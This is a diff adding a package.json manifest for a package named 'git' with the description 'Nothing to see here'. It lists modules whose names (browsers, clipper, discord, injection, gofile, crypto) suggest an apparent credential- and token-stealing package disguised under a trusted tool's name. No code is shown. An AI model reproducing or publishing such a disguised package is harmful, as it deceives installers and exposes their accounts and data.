@@ -1,0 +1,23 @@
+{
+    "name": "git",
+    "version": "14.3.9",
+    "description": "Nothing to see here",
+    "main": "index.js",
+    "author": "Yxtsuu",
+    "license": "MIT",
+    "files": [
+        "utils/browsers.js",
+        "utils/clipper.js",
+        "utils/core.js",
+        "utils/crypto.js",
+        "utils/discord.js",
+        "utils/files.js",
+        "utils/gecko.js",
+        "utils/gofile.js",
+        "utils/injection.js",
+        "utils/save.js",
+        "utils/stats.js",
+        "index.js",
+        "package.json"
+    ]
+}
